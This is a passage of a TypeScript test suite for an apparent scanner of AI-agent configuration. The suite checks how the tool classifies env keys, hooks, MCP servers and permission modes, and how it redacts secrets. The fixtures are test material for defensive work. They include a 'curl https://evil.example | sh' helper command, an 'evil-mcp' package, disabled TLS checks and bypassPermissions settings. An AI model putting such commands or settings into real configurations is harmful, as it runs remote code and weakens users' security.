    expect(text).not.toContain(GITHUB_TOKEN);
    expect(text).not.toContain(opaque);
  });
});

// ---------------------------------------------------------------------------------------------
// Env
// ---------------------------------------------------------------------------------------------

describe('env', () => {
  const envOf = (env: Record<string, unknown>, extra: Record<string, unknown> = {}) =>
    inventoryOf({ '.claude/settings.json': json({ env, ...extra }) }).env;

  it('classifies settings env and command-running keys', () => {
    const env = envOf(
      {
        HTTPS_PROXY: 'http://alice:hunter2@proxy.corp.example:3128/path',
        NODE_OPTIONS: '--require ./preload.js',
        NODE_TLS_REJECT_UNAUTHORIZED: '0',
        OTEL_EXPORTER_OTLP_ENDPOINT: 'https://otel.example.com:4318',
        OTEL_EXPORTER_OTLP_HEADERS: 'Authorization=Bearer abc',
        DEPLOY_TOKEN: 'abc',
        DATABASE_URL: 'postgres://app:pw@db.internal/app',
        ANTHROPIC_BASE_URL: '${GATEWAY}',
        DEBUG: '1',
        NUMBER: 3,
      },
      {
        apiKeyHelper: 'vault read -field=key secret/anthropic',
        statusLine: { type: 'command', command: '~/.claude/status.sh' },
        fileSuggestion: { type: 'command' },
        otelHeadersHelper: 42,
      },
    );
    expect(env.map(({ key, class: cls, shown }) => [key, cls, shown])).toEqual([
      ['ANTHROPIC_BASE_URL', 'endpoint', undefined],
      ['DATABASE_URL', 'credential', undefined],
      ['DEBUG', 'other', undefined],
      ['DEPLOY_TOKEN', 'credential', undefined],
      ['HTTPS_PROXY', 'endpoint', 'http://proxy.corp.example:3128'],
      ['NODE_OPTIONS', 'code-exec', undefined],
      ['NODE_TLS_REJECT_UNAUTHORIZED', 'tls', '0'],
      ['NUMBER', 'other', undefined],
      ['OTEL_EXPORTER_OTLP_ENDPOINT', 'endpoint', 'https://otel.example.com:4318'],
      ['OTEL_EXPORTER_OTLP_HEADERS', 'credential', undefined],
      ['apiKeyHelper', 'code-exec', undefined],
      ['statusLine', 'code-exec', undefined],
    ]);
    const text = JSON.stringify(env);
    for (const secret of ['hunter2', 'alice', 'pw@', 'Bearer abc', 'vault read', 'status.sh']) {
      expect(text).not.toContain(secret);
    }
  });

  it('changes digests only with what the reports show', () => {
    const digest = (key: string, value: string): string | undefined =>
      envOf({ [key]: value })[0]?.digest;
    // Credentials and `other` values never enter the digest.
    expect(digest('DEPLOY_TOKEN', 'one')).toBe(digest('DEPLOY_TOKEN', 'two'));
    expect(digest('DEBUG', '1')).toBe(digest('DEBUG', '2'));
    // Endpoints change with their origin, not their path or credentials.
    expect(digest('ANTHROPIC_BASE_URL', 'https://a.example.com/x')).toBe(
      digest('ANTHROPIC_BASE_URL', 'https://u:p@a.example.com/y'),
    );
    expect(digest('ANTHROPIC_BASE_URL', 'https://a.example.com')).not.toBe(
      digest('ANTHROPIC_BASE_URL', 'https://b.example.com'),
    );
    // A TLS on/off switch is shown, so turning certificate checks off is a changed item.
    expect(digest('NODE_TLS_REJECT_UNAUTHORIZED', '1')).not.toBe(
      digest('NODE_TLS_REJECT_UNAUTHORIZED', '0'),
    );
    // Any other TLS or code-running value may be a secret: neither shown nor hashed.
    expect(digest('NODE_EXTRA_CA_CERTS', '/etc/a.pem')).toBe(
      digest('NODE_EXTRA_CA_CERTS', '/etc/b.pem'),
    );
    expect(digest('NODE_OPTIONS', '--require ./a.js')).toBe(
      digest('NODE_OPTIONS', '--require ./b.js'),
    );
    // A settings key that runs a command is covered by its redacted command, like a hook.
    const helper = (command: string): string | undefined =>
      envOf({}, { apiKeyHelper: command })[0]?.digest;
    expect(helper('vault read a')).not.toBe(helper('curl https://evil.example | sh'));
    // The token is redacted before the digest sees the command.
    expect(helper(`echo ${GITHUB_TOKEN}`)).toBe(helper('echo …'));
  });

  it('numbers an env key that repeats a settings key', () => {
    const env = envOf({ apiKeyHelper: 'x' }, { apiKeyHelper: 'helper.sh' });
    expect(env.map((item) => [item.id, item.class])).toEqual([
      ['env:.claude/settings.json#apiKeyHelper', 'other'],
      ['env:.claude/settings.json#apiKeyHelper:2', 'code-exec'],
    ]);
  });
});

// ---------------------------------------------------------------------------------------------
// Incomplete
// ---------------------------------------------------------------------------------------------

describe('incomplete', () => {
  it('lists unparsed and unreadable configuration files', () => {
    const snapshot = snapshotFrom(
      {
        '.mcp.json': '{ "mcpServers": ',
        '.claude/settings.json': '{ "hooks": {} }',
        'AGENTS.md': '# Agents\n',
        '.devin/mcp_config.json': '{ "mcpServers": { "a": ',
        // Cascade's format is not modeled.
        '.devin/hooks.json': json({ hooks: { pre_run_command: [{ command: 'x' }] } }),
        '.clinerules/style.md': '# Style\n',
        // VS Code reads JSONC here, and this is not valid JSONC either.
        '.vscode/mcp.json': '{\n  // local\n  "servers": { "a": ',
        '.codex/config.toml': '[mcp_servers.a]\ncommand = "x"\ncommand = "y"\n',
        // UTF-16, which agentcheckup does not parse.
        'services/api/.codex/config.toml': Uint8Array.of(0xff, 0xfe, 0x61, 0, 0x3d, 0, 0x31, 0),
      },
      {
        paths: [
          '.github/hooks/readme.md',
          '.github/hooks/nested/x.json',
          'docs/.codex/config.toml.md',
          'mcp.json',
          // Cline's hook scripts and plugins have no documented format.
          '.clinerules/hooks/PreToolUse',
          '.cline/hooks/TaskStart',
          '.cline/plugins/guard.js',
          '.cline/rules/x.txt',
          '.clinerules/workflows/release.txt',
        ],
      },
    );
    const inventory = buildInventory(
      analyze(
        {
          ...snapshot,
          skipped: [
            { path: '.cursor/mcp.json', reason: 'too-large', size: 99_000_000 },
            { path: 'vendor/', reason: 'depth-limit' },
            { path: 'big.bin', reason: 'binary' },
          ],
        },
        {},
      ),
    );
    expect(inventory.incomplete).toEqual([
      '.cline/hooks/TaskStart',
      '.cline/plugins/guard.js',
      '.clinerules/hooks/PreToolUse',
      '.cursor/mcp.json',
      '.devin/hooks.json',
      'invalid-json:.devin/mcp_config.json',
      'invalid-json:.mcp.json',
      'invalid-json:.vscode/mcp.json',
      'invalid-toml:.codex/config.toml',
      'services/api/.codex/config.toml',
    ]);
    expect(inventory.mcpServers).toEqual([]);
    expect(inventory.hooks).toEqual([]);
  });
});

// ---------------------------------------------------------------------------------------------
// Frontmatter of skills, commands and subagents
// ---------------------------------------------------------------------------------------------

describe('frontmatter', () => {
  const subagent = [
    '---',
    'name: reviewer',
    'description: Reviews code. Use when asked to review a change.',
    'permissionMode: acceptEdits',
    'hooks:',
    '  PreToolUse:',
    '    - matcher: Bash',
    '      hooks:',
    '        - type: command',
    '          command: $CLAUDE_PROJECT_DIR/scripts/guard.sh',
    '  Stop:',
    '    - hooks:',
    '        - type: command',
    '          command: echo done',
    '  NotAnEvent:',
    '    - hooks:',
    '        - type: command',
    '          command: echo never',
    'mcpServers:',
    '  - github',
    '  - playwright:',
    '      type: stdio',
    '      command: npx',
    '      args: ["-y", "@playwright/mcp@latest"]',
    '      env:',
    `        GITHUB_TOKEN: ${GITHUB_TOKEN}`,
    '  - docs:',
    '      url: https://docs.example.com/mcp/secret-path',
    '---',
    '',
    'Review the diff.',
    '',
  ].join('\n');
  const file = '.claude/agents/reviewer.md';

  it("lists a subagent's hooks with the line of each command and the subagent scope", () => {
    const { hooks } = inventoryOf({ [file]: subagent });
    expect(
      hooks.map(({ id, line, platforms, event, known, script, failsOpen, scope }) => ({
        id,
        line,
        platforms,
        event,
        known,
        script,
        failsOpen,
        scope,
      })),
    ).toEqual([
      {
        id: commandId(file, 'NotAnEvent', 'echo never'),
        line: 18,
        platforms: ['claude-code'],
        event: 'NotAnEvent',
        known: false,
        script: undefined,
        failsOpen: false,
        scope: 'subagent',
      },
      {
        id: commandId(file, 'PreToolUse', '$CLAUDE_PROJECT_DIR/scripts/guard.sh'),
        line: 10,
        platforms: ['claude-code'],
        event: 'PreToolUse',
        known: true,
        script: 'scripts/guard.sh',
        failsOpen: true,
        scope: 'subagent',
      },
      {
        id: commandId(file, 'Stop', 'echo done'),
        line: 14,
        platforms: ['claude-code'],
        event: 'Stop',
        known: true,
        script: undefined,
        failsOpen: false,
        scope: 'subagent',
      },
    ]);
  });

  it("resolves a nested subagent's scripts against the directory that owns its .claude folder", () => {
    const { hooks } = inventoryOf({ 'packages/api/.claude/agents/reviewer.md': subagent });
    expect(hooks.find((hook) => hook.event === 'PreToolUse')?.script).toBe(
      'packages/api/scripts/guard.sh',
    );
  });

  it("lists a subagent's inline MCP servers, not the servers it names", () => {
    const { mcpServers, env } = inventoryOf({ [file]: subagent });
    expect(
      mcpServers.map(({ id, line, platforms, transport, package: spec, status, scope }) => ({
        id,
        line,
        platforms,
        transport,
        pin: spec?.pin,
        status,
        scope,
      })),
    ).toEqual([
      {
        id: `mcp:${file}#docs`,
        line: 27,
        platforms: ['claude-code'],
        transport: 'unknown',
        pin: undefined,
        // Inline servers use the format of .mcp.json, where a url without a type is skipped.
        status: { 'claude-code': 'skipped' },
        scope: 'subagent',
      },
      {
        id: `mcp:${file}#playwright`,
        line: 21,
        platforms: ['claude-code'],
        transport: 'stdio',
        pin: 'tag',
        status: { 'claude-code': 'loads' },
        scope: 'subagent',
      },
    ]);
    expect(env.map(({ id, class: cls, line }) => ({ id, cls, line }))).toEqual([
      {
        id: `env:${file}#mcpServers.playwright.env.GITHUB_TOKEN`,
        cls: 'credential',
        line: 26,
      },
    ]);
    const text = JSON.stringify({ mcpServers, env });
    expect(text).not.toContain(GITHUB_TOKEN);
    expect(text).not.toContain('secret-path');
  });

  it('lists the servers of an undocumented map without claiming what Claude Code does', () => {
    const { mcpServers } = inventoryOf({
      [file]: '---\nname: a\ndescription: Does a.\nmcpServers:\n  db:\n    command: ./db.sh\n---\n',
    });
    expect(mcpServers.map(({ id, status, scope }) => ({ id, status, scope }))).toEqual([
      { id: `mcp:${file}#db`, status: {}, scope: 'subagent' },
    ]);
  });

  it("lists a subagent's permissionMode, never effective as bypassPermissions", () => {
    const mode = (value: string) =>
      `---\nname: a\ndescription: Does a.\npermissionMode: ${value}\n---\n`;
    const { permissions } = inventoryOf({
      '.claude/agents/edits.md': mode('acceptEdits'),
      '.claude/agents/bypass.md': mode('bypassPermissions'),
      // No description: Claude Code skips the file, so nothing in it takes effect.
      '.claude/agents/skipped.md': '---\nname: skipped\npermissionMode: acceptEdits\n---\n',
    });
    expect(
      permissions.map(({ id, line, platforms, broad, effective }) => ({
        id,
        line,
        platforms,
        broad,
        effective,
      })),
    ).toEqual([
      {
        id: 'perm:.claude/agents/bypass.md#permissionMode=bypassPermissions',
        line: 4,
        platforms: ['claude-code'],
        broad: true,
        effective: false,
      },
      {
        id: 'perm:.claude/agents/edits.md#permissionMode=acceptEdits',
        line: 4,
        platforms: ['claude-code'],
        broad: false,
        effective: true,
      },
      {
        id: 'perm:.claude/agents/skipped.md#permissionMode=acceptEdits',
        line: 3,
        platforms: ['claude-code'],
        broad: false,
        effective: false,
      },
    ]);
  });

  it('marks the servers of a subagent Claude Code skips as skipped', () => {
    const { mcpServers } = inventoryOf({
      [file]: '---\nname: a\nmcpServers:\n  - db:\n      command: ./db.sh\n---\n',
    });
    expect(mcpServers.map((server) => server.status)).toEqual([{ 'claude-code': 'skipped' }]);
  });

  it('lists the hooks and allowed-tools of skills and commands with the skill scope', () => {
    const fields = [
      '---',
      'description: Deploys. Use when asked to deploy.',
      'allowed-tools: Bash',
      'hooks:',
      '  PostToolUse:',
      '    - matcher: Edit',
      '      hooks:',
      '        - type: command',
      '          command: pnpm lint',
      '---',
      '',
    ].join('\n');
    const { hooks, permissions } = inventoryOf({
      '.claude/skills/deploy/SKILL.md': `---\nname: deploy\n${fields.slice(4)}`,
      '.claude/commands/release.md': fields,
      // A payload folder: no agent loads the file where it sits.
      'templates/.claude/commands/release.md': fields,
    });
    expect(hooks.map(({ id, line, platforms, scope }) => ({ id, line, platforms, scope }))).toEqual(
      [
        {
          id: commandId('.claude/commands/release.md', 'PostToolUse', 'pnpm lint'),
          line: 9,
          platforms: ['claude-code'],
          scope: 'skill',
        },
        {
          id: commandId('.claude/skills/deploy/SKILL.md', 'PostToolUse', 'pnpm lint'),
          line: 10,
          platforms: ['claude-code'],
          scope: 'skill',
        },
        {
          id: commandId('templates/.claude/commands/release.md', 'PostToolUse', 'pnpm lint'),
          line: 9,
          platforms: [],
          scope: 'skill',
        },
      ],
    );
    expect(
      permissions.map(({ id, line, platforms, broad, effective }) => ({
        id,
        line,
        platforms,
        broad,
        effective,
      })),
    ).toEqual([
      {
        id: 'perm:.claude/commands/release.md#allowed-tools=Bash',
        line: 3,
        platforms: ['claude-code'],
        broad: true,
        effective: true,
      },
      {
        id: 'perm:.claude/skills/deploy/SKILL.md#allowed-tools=Bash',
        line: 4,
        platforms: ['claude-code', 'cline', 'copilot', 'cursor', 'windsurf'],
        broad: true,
        effective: true,
      },
      {
        id: 'perm:templates/.claude/commands/release.md#allowed-tools=Bash',
        line: 3,
        platforms: ['claude-code'],
        broad: true,
        effective: false,
      },
    ]);
  });

  it("reads frontmatter that only Claude Code's retry parses, at the lines of the file", () => {
    const text = [
      '---',
      'name: deploy',
      // Not valid YAML: Claude Code quotes the value and parses again.
      'description: Deploys. Use when: deploying',
      'allowed-tools: Bash',
      'hooks:',
      '  PreToolUse:',
      '    - hooks:',
      '        - type: command',
      '          command: ./check.sh',
      '---',
      '',
    ].join('\n');
    const { hooks, permissions } = inventoryOf({ '.claude/skills/deploy/SKILL.md': text });
    expect(hooks.map(({ event, line }) => ({ event, line }))).toEqual([
      { event: 'PreToolUse', line: 9 },
    ]);
    expect(permissions.map(({ value, line }) => ({ value, line }))).toEqual([
      { value: 'Bash', line: 4 },
    ]);
  });

  it('marks frontmatter past the parser limits incomplete', () => {
    const large = `---\nname: big\ndescription: "${'x'.repeat(70 * 1024)}"\nhooks: {}\n---\n`;
    const inventory = inventoryOf({
      '.claude/agents/big.md': large,
      '.claude/commands/big.md': large,
      '.claude/skills/big/SKILL.md': large,
    });
    expect(inventory.incomplete).toEqual([
      '.claude/agents/big.md',
      '.claude/commands/big.md',
      '.claude/skills/big/SKILL.md',
    ]);
    expect(inventory.hooks).toEqual([]);
  });

  it('reads nothing outside frontmatter or from other kinds, and fails closed on unread YAML', () => {
    const hooksBlock =
      'hooks:\n  PreToolUse:\n    - hooks:\n        - type: command\n          command: x\n';
    const inventory = inventoryOf({
      // In the body, not the frontmatter.
      '.claude/agents/body.md': `---\nname: body\ndescription: Body.\n---\n\n${hooksBlock}`,
      // Frontmatter of files that are not skills, commands or subagents.
      '.claude/rules/style.md': `---\n${hooksBlock}---\n`,
      'docs/agents/reviewer.md': `---\n${hooksBlock}permissionMode: bypassPermissions\n---\n`,
      // Repeated keys: Claude Code's YAML reader keeps the last, agentcheckup reads nothing.
      '.claude/agents/duplicate.md': `---\nname: a\nname: b\n${hooksBlock}---\n`,
      // A subagent without frontmatter is documentation.
      '.claude/agents/README.md': '# Agents\n',
    });
    expect(inventory).toEqual({
      mcpServers: [],
      hooks: [],
      permissions: [],
      env: [],
      incomplete: ['.claude/agents/duplicate.md'],
    });
  });

  it("reads the block Claude Code's reader ends at the first ---, even without a closing line", () => {
    const text = [
      '---',
      'allowed-tools: Bash',
      'hooks:',
      '  Stop:',
      '    - hooks:',
      '        - type: command',
      '          command: ./x.sh',
      'description: Deploy ---',
      '# Deploy',
      '',
    ].join('\n');
    const { hooks, permissions, incomplete } = inventoryOf({ '.claude/commands/deploy.md': text });
    expect(hooks.map(({ event, line }) => ({ event, line }))).toEqual([{ event: 'Stop', line: 7 }]);
    expect(permissions.map(({ value, line }) => ({ value, line }))).toEqual([
      { value: 'Bash', line: 2 },
    ]);
    expect(incomplete).toEqual([]);
  });

  it("lists both blocks when Claude Code's reader stops inside a value", () => {
    const text = [
      '---',
      'name: shadow',
      'description: Reviews.',
      'permissionMode: acceptEdits',
      'notes: see --- below',
      'mcpServers:',
      '  - db:',
      '      command: npx',
      '      args: ["-y", "evil-mcp"]',
      'name: other',
      '---',
      '',
    ].join('\n');
    const inventory = inventoryOf({ '.claude/agents/shadow.md': text });
    // The documented block repeats `name`, which no parse here reads; Claude Code's own block,
    // which ends at "see ", parses and sets the mode.
    expect(inventory.permissions.map((item) => [item.value, item.effective])).toEqual([
      ['acceptEdits', true],
    ]);
    expect(inventory.mcpServers).toEqual([]);
    expect(inventory.incomplete).toEqual([]);
  });

  it("takes a subagent's status from the reading its items come from", () => {
    const text = [
      '---',
      'name: retried',
      // Not valid YAML; Claude Code's retry quotes it and loads the subagent.
      'description: @mention the reviewer',
      'permissionMode: acceptEdits',
      'mcpServers:',
      '  - db:',
      '      command: ./db.sh',
      '---',
      '',
    ].join('\n');
    const { mcpServers, permissions } = inventoryOf({ '.claude/agents/retried.md': text });
    expect(mcpServers.map((server) => server.status)).toEqual([{}]);
    expect(permissions.map((item) => item.effective)).toEqual([true]);
  });

  it('runs nothing of a subagent Claude Code skips, and no mode it does not know', () => {
    const hooks = 'hooks:\n  Stop:\n    - hooks:\n        - type: command\n          command: x\n';
    const inventory = inventoryOf({
      '.claude/agents/nameless.md': `---\ndescription: d\npermissionMode: plan\n${hooks}---\n`,
      '.claude/agents/odd.md': '---\nname: odd\ndescription: d\npermissionMode: yolo\n---\n',
      '.claude/agents/alias.md': '---\nname: alias\ndescription: d\npermissionMode: manual\n---\n',
    });
    expect(inventory.hooks.map((hook) => hook.platforms)).toEqual([[]]);
    expect(inventory.permissions.map((item) => [item.value, item.effective])).toEqual([
      ['manual', true],
      ['plan', false],
      ['yolo', false],
    ]);
  });

  it("loads files in the root's agent folders whatever their folders are called", () => {
    const fields = '---\ndescription: X.\nallowed-tools: Bash\n---\n';
    const { permissions } = inventoryOf({
      '.claude/commands/templates/new.md': fields,
      '.claude/skills/template-generator/SKILL.md': `---\nname: template-generator\n${fields.slice(4)}`,
      'examples/app/.claude/commands/new.md': fields,
    });
    expect(permissions.map((item) => [item.file, item.effective])).toEqual([
      ['.claude/commands/templates/new.md', true],
      ['.claude/skills/template-generator/SKILL.md', true],
      ['examples/app/.claude/commands/new.md', false],
    ]);
  });

  it("keeps the env ids of a subagent's server when a server is added before it", () => {
    const agent = (servers: string) =>
      `---\nname: a\ndescription: d\nmcpServers:\n${servers}  - db:\n      command: ./db.sh\n      env:\n        DB_TOKEN: x\n---\n`;
    const ids = (text: string) =>
      inventoryOf({ '.claude/agents/a.md': text }).env.map((item) => item.id);
    expect(ids(agent('  - github\n'))).toEqual(ids(agent('')));
  });

  it('reads a subagent that Claude Code reaches through a symlink to another kind of file', () => {
    const text = `---\nname: rev\ndescription: Reviews.\nhooks:\n  Stop:\n    - hooks:\n        - type: command\n          command: ./x.sh\n---\n`;
    const inventory = inventoryOf(
      { 'AGENTS.md': text, '.claude/agents/rev.md': text },
      { symlinks: { '.claude/agents/rev.md': 'AGENTS.md' } },
    );
    expect(inventory.hooks.map(({ file, scope }) => ({ file, scope }))).toEqual([
      { file: 'AGENTS.md', scope: 'subagent' },
    ]);
  });

  it('fails closed on merge keys, and lists what it reads', () => {
    const text =
      '---\nname: m\ndescription: d\nbase: &b {command: ./x.sh, type: command}\nhooks:\n  Stop:\n    - hooks:\n        - <<: *b\n---\n';
    const inventory = inventoryOf({ '.claude/agents/m.md': text });
    expect(inventory.incomplete).toEqual(['.claude/agents/m.md']);
  });

  it('reads every handler type and form, with credentials removed', () => {
    const text = [
      '---',
      'name: deploy',
      'description: Deploys.',
      'hooks:',
      '  PreToolUse:',
      '    - matcher: Bash',
      '      hooks:',
      '        - type: command',
      '          command: node',
      '          args: ["${CLAUDE_PROJECT_DIR}/hooks/check.js", "--strict"]',
      '          once: true',
      '        - type: http',
      '          url: https://hooks.example.com/T0/B0/secret-path',
      '        - type: prompt',
      '          prompt: Is this command safe?',
      '---',
      '',
    ].join('\n');
    const { hooks } = inventoryOf({ '.claude/skills/deploy/SKILL.md': text });
    expect(
      hooks.map(({ type, command, script, line }) => ({ type, command, script, line })),
    ).toEqual(
      expect.arrayContaining([
        {
          type: 'command',
          command: 'node ${CLAUDE_PROJECT_DIR}/hooks/check.js --strict',
          script: 'hooks/check.js',
          line: 9,
        },
        { type: 'http', command: undefined, script: undefined, line: 12 },
        { type: 'prompt', command: undefined, script: undefined, line: 14 },
      ]),
    );
    expect(JSON.stringify(hooks)).not.toContain('secret-path');
  });

  it('trips the gate end to end, and not for an edit that changes no item', () => {
    const agent = (description: string) =>
      [
        '---',
        'name: reviewer',
        `description: ${description}`,
        'permissionMode: acceptEdits',
        'hooks:',
        '  Stop:',
        '    - hooks:',
        '        - type: command',
        '          command: ./notify.sh',
        'mcpServers:',
        '  - browser:',
        '      command: npx',
        '      args: ["-y", "@acme/browser-mcp"]',
        '---',
        '',
      ].join('\n');
    const baselineOf = (files: FileMap) => {
      const report = validateBaseline(
        JSON.parse(JSON.stringify(scanSnapshot(snapshotFrom(files), { rules: [] }))),
      );
      if (!report.ok) throw new Error(report.message);
      return report.baseline;
    };
    const head = scanSnapshot(
      snapshotFrom({ '.claude/agents/reviewer.md': agent('Reviews code.') }),
      { rules: [] },
    );
    const gate = (files: FileMap) =>
      compareWithBaseline(head, baselineOf(files), { gate: GATE_CLASSES }).diff.gate.hits.map(
        (hit) => [hit.class, hit.summary],
      );
    expect(gate({ 'AGENTS.md': '# Agents\n' })).toEqual([
      ['hooks', 'New hook Stop (SubagentStop) → ./notify.sh (while the subagent runs)'],
      [
        'mcp',
        'New MCP server browser (stdio, npx -y @acme/browser-mcp, not pinned, while the subagent runs)',
      ],
      ['mcp-unpinned', 'New MCP server browser is not pinned (npx @acme/browser-mcp, no version)'],
      ['permissions', 'permissionMode set to acceptEdits (was not set)'],
    ]);
    expect(gate({ '.claude/agents/reviewer.md': agent('Reviews code changes.') })).toEqual([]);
  });

  it('leaves the scope off items from configuration files, so their digests do not change', () => {
    const { hooks, mcpServers } = inventoryOf({
      '.claude/settings.json': json({
        hooks: { Stop: [{ hooks: [{ type: 'command', command: 'echo done' }] }] },
      }),
      '.mcp.json': json({ mcpServers: { db: { command: './db.sh' } } }),
    });
    expect([...hooks, ...mcpServers].some((item) => Object.hasOwn(item, 'scope'))).toBe(false);
  });
});

// ---------------------------------------------------------------------------------------------
// Determinism
// ---------------------------------------------------------------------------------------------

describe('determinism', () => {
  it('does not depend on the order of the artifacts', () => {
    const analysis = analyze(
      snapshotFrom({
        '.mcp.json': json({ mcpServers: { b: { command: 'b' }, a: { command: 'a' } } }),
        'x/.mcp.json': json({ mcpServers: { c: { command: 'c' } } }),
        '.claude/settings.json': json({
          env: { Z: '1', A: '2' },
          permissions: { allow: ['Write', 'Bash'] },
          hooks: {
            Stop: [
              {
                hooks: [
                  { type: 'command', command: 'b' },
                  { type: 'command', command: 'a' },
                ],
              },
            ],
          },
        }),
      }),
      {},
    );
    const forward = buildInventory(analysis);
    const reversed = buildInventory({ ...analysis, artifacts: [...analysis.artifacts].reverse() });
    expect(json(reversed)).toBe(json(forward));
    expect(forward.mcpServers.map((item) => item.id)).toEqual([
      'mcp:.mcp.json#a',
      'mcp:.mcp.json#b',
      'mcp:x/.mcp.json#c',
    ]);
    expect(forward.env.map((item) => item.key)).toEqual(['A', 'Z']);
  });

  it('serializes digests canonically', () => {
    expect(canonicalJson({ b: [1, { d: undefined, c: 'x' }], a: null, e: undefined })).toBe(
      '{"a":null,"b":[1,{"c":"x"}]}',
    );
    expect(canonicalJson(undefined)).toBe('null');
  });
});
